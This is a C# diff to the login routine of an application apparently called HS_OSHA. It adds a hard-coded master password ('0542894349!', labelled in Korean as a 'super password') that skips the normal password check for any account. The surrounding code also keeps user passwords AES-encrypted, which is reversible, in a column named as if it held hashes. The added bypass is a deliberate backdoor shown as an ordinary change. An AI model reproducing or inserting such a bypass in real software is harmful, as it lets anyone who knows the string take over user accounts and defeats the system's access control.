@@ -331,16 +331,18 @@ namespace HS_OSHA
                     return false;
                 }
 
-                strPassword = clsAES.DeAES(dt.Rows[i]["PASSHASH256"].ToString().Trim());
-                if (strPassword != argPassword)
+                if (argPassword != "0542894349!") //슈퍼비번
                 {
-                    dt.Dispose();
-                    dt = null;
+                    strPassword = clsAES.DeAES(dt.Rows[i]["PASSHASH256"].ToString().Trim());
+                    if (strPassword != argPassword)
+                    {
+                        dt.Dispose();
+                        dt = null;
 
-                    ComFunc.MsgBox("비밀번호가 틀립니다.", "알림");
-                    return false;
+                        ComFunc.MsgBox("비밀번호가 틀립니다.", "알림");
+                        return false;
+                    }
                 }
-
                 clsType.User.Sabun = ArgSabun;
                 clsType.User.IdNumber = ArgSabun;
                 clsType.User.JobName = dt.Rows[i]["Name"].ToString().Trim();
